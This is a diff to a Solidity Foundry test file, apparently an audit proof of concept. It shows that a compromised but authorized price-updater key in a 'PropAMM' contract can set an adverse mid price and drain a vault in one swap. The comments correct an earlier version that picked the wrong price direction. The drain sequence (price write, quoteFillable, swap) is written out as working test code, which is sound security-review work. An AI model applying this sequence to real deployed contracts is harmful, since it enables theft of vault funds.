@@ -101,19 +101,30 @@ contract CapitanMonasterioQuoteAndPullTest is Test {
     /// @notice What a compromised updater key genuinely enables, per the review this PoC was
     /// revised against: the key is real and authorized (this is not a bypass of the access
     /// control proven above), so whoever holds it can write ANY `mid` — `_pricing` only checks
-    /// `mid != 0` (`PropAMM.sol:298`), with no comparison against an external reference. Setting
-    /// `mid` to 1% of the honest price and swapping against the vault in the same transaction
-    /// drains `tokenOut` at that price, bounded only by the vault's own balance and
-    /// `_priceImpact`'s cap on a single fill (found here via `quoteFillable`, the contract's own
-    /// "most this pair can pay in one fill" function, rather than guessed at). This is the
-    /// high-severity case the quote-and-pull framing in the prior version of this file did not
-    /// cover.
+    /// `mid != 0` (`PropAMM.sol:298`), with no comparison against an external reference.
+    ///
+    /// CORRECTION from a second review: an earlier version always wrote a LOW `adverseMid` and
+    /// asserted only that the vault's `tokenOut` balance dropped. That is only an attack when
+    /// `tokenOut` is token0 — `mid` prices token0 in token1 (`PropAMM.sol:306-310`), so which
+    /// direction counts as "cheap for the attacker" flips with deploy-time token ordering. The
+    /// version that shipped happened to deploy with `tokenIn` as token0, where a LOW mid makes
+    /// `tokenOut` MORE expensive: the logged run paid ~400 `tokenIn` (worth 1,000,000 `tokenOut`
+    /// at the honest price) for only 10,000 `tokenOut` — the attacker overpaid massively, the
+    /// opposite of a drain. The `tokenOut`-balance-only assertion couldn't catch this because it
+    /// ignored what the vault received in `tokenIn`.
+    ///
+    /// Fixed two ways: the adverse `mid` is now picked per the actual token order, so the test
+    /// drains the vault regardless of which address happens to deploy as token0; and the
+    /// assertion compares VALUE (the vault's `tokenOut` left, plus the `tokenIn` it received,
+    /// both priced at the honest mid) against its starting value, not unit count.
     function test_compromisedUpdaterKey_drainsVaultWithAdverseMid() public {
         _updatePriceAs(updater, 0, HONEST_MID);
-        uint256 vaultValueAtHonestPrice = VAULT_TOKEN_OUT_BALANCE; // all of it, priced in tokenOut
 
-        // The compromise: the legitimate (authorized) key writes a price 99% below market.
-        uint256 adverseMid = HONEST_MID / 100;
+        bool tokenInIsToken0 = address(tokenIn) < address(tokenOut);
+        // `_pricing`: tokenIn==token0 -> amountOut = amountIn*mid/SCALE (higher mid = more out);
+        // tokenOut==token0 -> amountOut = amountIn*SCALE/mid (lower mid = more out). Either way,
+        // this is the mid that makes tokenOut cheap for whoever is buying it with tokenIn.
+        uint256 adverseMid = tokenInIsToken0 ? HONEST_MID * 100 : HONEST_MID / 100;
         _updatePriceAs(updater, 0, adverseMid);
 
         // Ask the contract itself for the largest single fill it will pay out at this price,
@@ -129,17 +140,27 @@ contract CapitanMonasterioQuoteAndPullTest is Test {
             propAmm.swap(address(tokenIn), address(tokenOut), maxFillableIn, expectedOut, attacker, block.timestamp);
 
         assertEq(amountOut, expectedOut, "drained exactly what quoteFillable priced at the adverse mid");
-        // What the taker paid (at the adverse mid) vs. what that same tokenOut was worth a moment
-        // earlier, at the honest price: the vault's loss, bounded by its own balance.
-        uint256 vaultValueLeftAtHonestPrice = tokenOut.balanceOf(vault);
+
+        // Value check, not a unit count: convert what the vault now holds in tokenIn back to its
+        // tokenOut-equivalent AT THE HONEST PRICE, using the same tokenIn/tokenOut-ordering
+        // formula `_pricing` itself uses, and compare the total against the vault's starting
+        // value. This is exactly what the earlier version's tokenOut-balance-only assertion missed.
+        uint256 vaultTokenInBalance = tokenIn.balanceOf(vault);
+        uint256 vaultTokenInValueInTokenOut = tokenInIsToken0
+            ? vaultTokenInBalance * HONEST_MID / PRICE_SCALE
+            : vaultTokenInBalance * PRICE_SCALE / HONEST_MID;
+        uint256 vaultTotalValueAfterAtHonestPrice = tokenOut.balanceOf(vault) + vaultTokenInValueInTokenOut;
+
         assertLt(
-            vaultValueLeftAtHonestPrice,
-            vaultValueAtHonestPrice,
-            "vault should be measurably drained relative to the honest-price baseline"
+            vaultTotalValueAfterAtHonestPrice,
+            VAULT_TOKEN_OUT_BALANCE,
+            "vault's total value (tokenOut left + tokenIn received, both at the honest price) should be measurably below its starting value"
         );
         emit log_named_uint("tokenOut drained in one tx", amountOut);
         emit log_named_uint("tokenIn the attacker paid for it", maxFillableIn);
-        emit log_named_uint("vault tokenOut balance remaining", vaultValueLeftAtHonestPrice);
+        emit log_named_uint("vault tokenOut balance remaining", tokenOut.balanceOf(vault));
+        emit log_named_uint("vault total value after, at honest price (tokenOut units)", vaultTotalValueAfterAtHonestPrice);
+        emit log_named_uint("vault starting value (tokenOut units)", VAULT_TOKEN_OUT_BALANCE);
     }
 
     //------------------------------
